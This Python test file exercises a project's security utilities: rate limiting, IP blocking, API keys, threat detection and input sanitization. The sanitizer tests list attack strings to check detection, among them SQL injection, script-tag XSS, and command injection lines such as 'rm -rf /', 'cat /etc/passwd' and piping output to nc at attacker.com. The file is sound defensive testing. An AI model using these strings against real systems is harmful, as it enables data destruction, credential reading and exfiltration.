"""Tests for security utilities."""

import pytest
import time
from datetime import datetime, timedelta
from unittest.mock import patch, Mock

from nimify.security import (
    RateLimiter, IPBlocklist, InputSanitizer, APIKeyManager,
    ThreatDetector, rate_limiter, ip_blocklist
)


class TestRateLimiter:
    """Test rate limiting functionality."""
    
    def test_rate_limiter_creation(self):
        """Test rate limiter initialization."""
        limiter = RateLimiter(requests_per_minute=60, burst_size=10)
        assert limiter.requests_per_minute == 60
        assert limiter.burst_size == 10
    
    def test_allow_requests_within_limit(self):
        """Test allowing requests within rate limit."""
        limiter = RateLimiter(requests_per_minute=60, burst_size=5)
        
        # First few requests should be allowed
        for _ in range(5):
            allowed, retry_after = limiter.is_allowed("127.0.0.1")
            assert allowed is True
            assert retry_after == 0
    
    def test_block_requests_over_limit(self):
        """Test blocking requests over rate limit."""
        limiter = RateLimiter(requests_per_minute=60, burst_size=2)
        
        # Use up the burst capacity
        limiter.is_allowed("127.0.0.1")
        limiter.is_allowed("127.0.0.1")
        
        # Next request should be blocked
        allowed, retry_after = limiter.is_allowed("127.0.0.1")
        assert allowed is False
        assert retry_after > 0
    
    def test_different_ips_independent(self):
        """Test that different IPs have independent rate limits."""
        limiter = RateLimiter(requests_per_minute=60, burst_size=1)
        
        # Use up capacity for first IP
        limiter.is_allowed("192.168.1.1")
        blocked, _ = limiter.is_allowed("192.168.1.1")
        assert blocked is False
        
        # Second IP should still be allowed
        allowed, _ = limiter.is_allowed("192.168.1.2")
        assert allowed is True
    
    def test_suspicious_activity_detection(self):
        """Test detection of suspicious activity patterns."""
        limiter = RateLimiter(requests_per_minute=10, burst_size=5)
        
        # Generate many requests to trigger suspicion
        for _ in range(50):
            limiter.is_allowed("192.168.1.100")
        
        is_suspicious = limiter.is_suspicious_activity("192.168.1.100")
        assert is_suspicious is True


class TestIPBlocklist:
    """Test IP blocking functionality."""
    
    def test_block_and_check_ip(self):
        """Test blocking and checking IP addresses."""
        blocklist = IPBlocklist()
        
        # Block an IP
        blocklist.block_ip("192.168.1.100", duration_minutes=60)
        
        # Check if IP is blocked
        assert blocklist.is_blocked("192.168.1.100") is True
        assert blocklist.is_blocked("192.168.1.101") is False
    
    def test_block_network(self):
        """Test blocking network ranges."""
        blocklist = IPBlocklist()
        
        # Block a network
        blocklist.block_network("192.168.1.0/24", duration_minutes=60)
        
        # IPs in the network should be blocked
        assert blocklist.is_blocked("192.168.1.50") is True
        assert blocklist.is_blocked("192.168.1.200") is True
        
        # IPs outside the network should not be blocked
        assert blocklist.is_blocked("10.0.0.1") is False
    
    def test_whitelist_checking(self):
        """Test whitelist functionality."""
        blocklist = IPBlocklist()
        
        # Localhost should be whitelisted
        assert blocklist.is_whitelisted("127.0.0.1") is True
        
        # Private networks should be whitelisted
        assert blocklist.is_whitelisted("10.0.0.1") is True
        assert blocklist.is_whitelisted("192.168.1.1") is True
        
        # Public IPs should not be whitelisted
        assert blocklist.is_whitelisted("8.8.8.8") is False
    
    def test_expiration(self):
        """Test that blocks expire automatically."""
        blocklist = IPBlocklist()
        
        # Block IP for very short duration
        blocklist.block_ip("192.168.1.100", duration_minutes=0.01)  # ~0.6 seconds
        
        # Should be blocked initially
        assert blocklist.is_blocked("192.168.1.100") is True
        
        # Wait for expiration
        time.sleep(1)
        
        # Should no longer be blocked
        assert blocklist.is_blocked("192.168.1.100") is False


class TestInputSanitizer:
    """Test input sanitization."""
    
    def test_detect_sql_injection(self):
        """Test detection of SQL injection attempts."""
        sql_attacks = [
            "' OR '1'='1",
            "UNION SELECT * FROM users",
            "DROP TABLE users;",
            "INSERT INTO admin VALUES('hacker')"
        ]
        
        for attack in sql_attacks:
            detected = InputSanitizer.scan_for_attacks(attack)
            assert "sql_injection" in detected
    
    def test_detect_script_injection(self):
        """Test detection of script injection attempts."""
        script_attacks = [
            "<script>alert('xss')</script>",
            "javascript:alert(1)",
            "data:text/html,<script>alert('xss')</script>"
        ]
        
        for attack in script_attacks:
            detected = InputSanitizer.scan_for_attacks(attack)
            assert "script_injection" in detected
    
    def test_detect_command_injection(self):
        """Test detection of command injection attempts."""
        command_attacks = [
            "test; rm -rf /",
            "test && cat /etc/passwd",
            "test | nc attacker.com 4444",
            "$(whoami)"
        ]
        
        for attack in command_attacks:
            detected = InputSanitizer.scan_for_attacks(attack)
            assert "command_injection" in detected
    
    def test_sanitize_safe_string(self):
        """Test sanitization of safe strings."""
        safe_string = "This is a normal string with numbers 123 and symbols !@#"
        result = InputSanitizer.sanitize_string(safe_string)
        assert result == safe_string
    
    def test_sanitize_dangerous_string(self):
        """Test sanitization of dangerous strings."""
        dangerous_string = "'; DROP TABLE users; --"
        
        with pytest.raises(ValueError, match="potentially malicious content"):
            InputSanitizer.sanitize_string(dangerous_string)
    
    def test_length_limiting(self):
        """Test string length limiting."""
        long_string = "x" * 2000
        result = InputSanitizer.sanitize_string(long_string, max_length=100)
        assert len(result) == 100
    
    def test_control_character_removal(self):
        """Test removal of control characters."""
        string_with_nulls = "test\x00string\x01with\x02control\x03chars"
        result = InputSanitizer.sanitize_string(string_with_nulls)
        assert "\x00" not in result
        assert "\x01" not in result
        assert result == "teststringwithcontrolchars"


class TestAPIKeyManager:
    """Test API key management."""
    
    def test_generate_api_key(self):
        """Test API key generation."""
        manager = APIKeyManager()
        api_key = manager.generate_api_key("test-service", ["predict", "admin"])
        
        assert isinstance(api_key, str)
        assert len(api_key) > 20  # Should be a reasonable length
    
    def test_validate_api_key(self):
        """Test API key validation."""
        manager = APIKeyManager()
        api_key = manager.generate_api_key("test-service", ["predict"])
        
        # Valid key with correct permission
        assert manager.validate_api_key(api_key, "predict") is True
        
        # Valid key with missing permission
        assert manager.validate_api_key(api_key, "admin") is False
        
        # Invalid key
        assert manager.validate_api_key("invalid-key", "predict") is False
    
    def test_api_key_rate_limiting(self):
        """Test API key rate limiting."""
        manager = APIKeyManager()
        api_key = manager.generate_api_key("test-service")
        
        # Simulate many requests
        for _ in range(1500):  # Over the default limit
            manager.validate_api_key(api_key, "predict")
        
        # Should be rate limited now
        is_limited = manager.is_key_rate_limited(api_key, requests_per_hour=1000)
        assert is_limited is True


class TestThreatDetector:
    """Test threat detection."""
    
    def test_record_failed_attempts(self):
        """Test recording of failed attempts."""
        detector = ThreatDetector()
        
        # Record several failed attempts
        for _ in range(3):
            detector.record_failed_attempt("192.168.1.100", "authentication")
        
        # Should not be under attack yet
        assert detector.is_under_attack("192.168.1.100") is False
        
        # Record more attempts
        for _ in range(3):
            detector.record_failed_attempt("192.168.1.100", "authentication")
        
        # Should be under attack now
        assert detector.is_under_attack("192.168.1.100") is True
    
    def test_pattern_anomaly_detection(self):
        """Test pattern anomaly detection."""
        detector = ThreatDetector()
        
        # Repeat a suspicious pattern many times
        pattern = "admin login attempt"
        
        for _ in range(15):
            is_anomaly = detector.detect_pattern_anomaly(pattern)
        
        # Should detect anomaly after many repetitions
        assert is_anomaly is True
    
    def test_request_content_analysis(self):
        """Test analysis of request content."""
        detector = ThreatDetector()
        
        # Analyze suspicious content
        suspicious_content = "admin password root secret SELECT * FROM users <script>alert(1)</script>"
        analysis = detector.analyze_request_content(suspicious_content)
        
        assert analysis["suspicious_keywords"] > 0
        assert analysis["sql_patterns"] > 0
        assert analysis["script_patterns"] > 0
    
    def test_clean_content_analysis(self):
        """Test analysis of clean content."""
        detector = ThreatDetector()
        
        clean_content = "normal model prediction request with valid input data"
        analysis = detector.analyze_request_content(clean_content)
        
        assert analysis["suspicious_keywords"] == 0
        assert analysis["sql_patterns"] == 0
        assert analysis["script_patterns"] == 0


class TestGlobalInstances:
    """Test global security instances."""
    
    def test_global_rate_limiter(self):
        """Test global rate limiter instance."""
        assert rate_limiter is not None
        assert hasattr(rate_limiter, 'is_allowed')
    
    def test_global_ip_blocklist(self):
        """Test global IP blocklist instance."""
        assert ip_blocklist is not None
        assert hasattr(ip_blocklist, 'is_blocked')
    
    def test_rate_limiter_integration(self):
        """Test integration with global rate limiter."""
        # This test ensures the global instance works
        allowed, retry_after = rate_limiter.is_allowed("test-ip")
        assert isinstance(allowed, bool)
        assert isinstance(retry_after, int)